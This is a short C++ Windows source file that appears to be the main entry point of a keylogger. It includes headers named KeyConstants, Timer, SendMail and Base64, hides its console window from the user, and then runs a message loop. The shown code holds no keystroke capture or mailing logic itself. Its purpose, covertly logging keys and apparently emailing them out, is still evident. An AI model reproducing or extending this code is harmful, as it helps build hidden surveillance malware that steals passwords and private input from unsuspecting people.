#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"

using namespace std;

int main()
{
	MSG Msg;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (GetMessage(&Msg, NULL, 0, 0))
	{

		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	return 0;
}